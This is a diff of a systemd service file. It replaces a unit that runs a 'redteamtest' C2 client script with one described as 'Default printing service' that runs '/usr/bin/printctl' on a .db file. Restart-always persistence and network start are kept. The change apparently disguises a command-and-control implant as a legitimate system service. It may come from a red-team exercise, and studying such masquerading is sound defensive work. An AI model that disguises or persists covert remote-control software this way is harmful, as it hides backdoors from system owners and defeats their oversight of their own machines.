@@ -1,9 +1,9 @@
 [Unit]
-Description=Extra swag, DO NOT REMOVE :)
+Description=Default printing service
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 /home/debian/redteamtest/c2client.py
+ExecStart=/usr/bin/printctl /usr/bin/printctl.db
 Restart=always
 RestartSec=10s
 
